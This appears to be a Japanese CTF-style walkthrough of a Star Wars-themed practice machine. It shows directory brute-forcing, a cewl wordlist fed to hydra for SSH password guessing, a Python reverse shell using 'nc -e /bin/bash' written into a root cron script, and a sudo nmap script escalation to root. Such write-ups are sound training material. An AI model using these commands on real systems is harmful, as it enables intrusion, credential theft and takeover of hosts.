### pspyの設定
- pspy32&64
  - 動いているプロセスを調べる。`ps aux`と違い動的に表示する
  - pspy32bit&64bitがあるので、bigの方を落とす。検索したらGithubでリンクをコピーしてwgetでダウンロードする
  - `https://github.com/DominicBreuker/pspy`
  - `~/tools/pspy/` pspyディレクトリの下に32bitと64bitのを置いておく




### keyword
- cewl,group,hydra,.bash_history,cron

### 注意
- ステガノグラフィができないので暗号が解読できない。stylesuxx.github.ioを使ってもパスワードが出てこない

## 攻略
- nmap
  - 22,80 
- サイトを見る
  - ソースに暗号みたいのがあって、これを解読しても意味ないラビットホールになっている。
  - yoda.pngの画像をステガノグラフィをするとパスワードが出てくるが、ここでは出てこないので書いておくと`babyYoda123`
- gobusterする
  - robots.txt,adminが出てくる。javascriptという気になるのもある。このサイトはjavascriptでできているので、拡張子のjsをつけて、もう一度gobusterでオプション`-x js`をつける
  - users.jsが見つかる
- users.jsを見ると、hanとskywalkerが記述してあるだけ
- /robots.txtを見る
  - /r2d2を見ると、何か文章がある 
- ssh
  - han,skywalkerの両方でやってみるが、hanで侵入できる
  - `ssh han@$IP` password:babyYoda123
- id
  - hanのみで特に目立ったのない 
- ユーザをチェック
  - `ls /home`
  - Darth,han,skywalkerが見つかる
- groupチェック
  - `cat /etc/group` anakinというグループがある
  - `find / -group anakin 2>/dev/null` evil.pyというのがある 
- `sudo -l`
  - 使えない 
- SUID
  - pkexecがある 
- homeを調べる
  - `.secrets -> note.txt`にヒントがある
  - `.bash_history`
- hanでDarthのhomeを見る
  - evil.pyというのがあるが、これはDarkユーザとanakinグループ書き込みできる 
- `cewl http://$IP/r2d2 > dict.txt`
  - オプションが付いてないが、デフォルトが`-d 2`はフォルダが２つ下まで探す。`-m 3`単語が3文字以上を探す 
- `hydra -l skywalker -P dict.txt ssh://$IP`
  - password:tatooine
- skywalkerでssh
- `id`
  - anakinグループに属しているのがわかる
  - `.bash_history`を見ると`service cron status`とcronを動かしているのがわかる
- `sudo -l`
  - 使えない 
- cronをチェック
  - `ps aux | grep root` これだと一瞬だけのプロセスしか見れないのでプロセスを動的に見れる違う方法を使う
  - pspyをダウンロードして。64bitなので
  - `./pspy64`
  - しばらくするとcronでevil.pyが動いているのがわかる
- Darthのhomeを見る
  - `cd /home/Darth`
  - evil.pyの下にリバースシェルを書き込む

```
import os
os.system("nc -e /bin/bash 192.168.56.101 9001")
```

- コードの説明
  - ncコマンドで接続する。-eオプションは接続後に実行するコマンド
  - `/bin/bash -i`にしたら、プロンプトが返ってくると思ったが、そもそも接続できなかった

- Darthになる
  - nc -nlvp 9001で待ち受ける
- reverse-shellが返ってくる
  - プロンプトがないので、対話型シェルにする  
- `sudo -l`
  - nmapがsudoで使える
- rootになる 
  - `echo "os.execute('/bin/sh')" > /tmp/root.nse`
  - `sudo nmap --script=/tmp/root.nse`
    - `--script`にはコマンドを書いたファイルを置くことができる。そしてnmapを起動したらファイルが実行される 
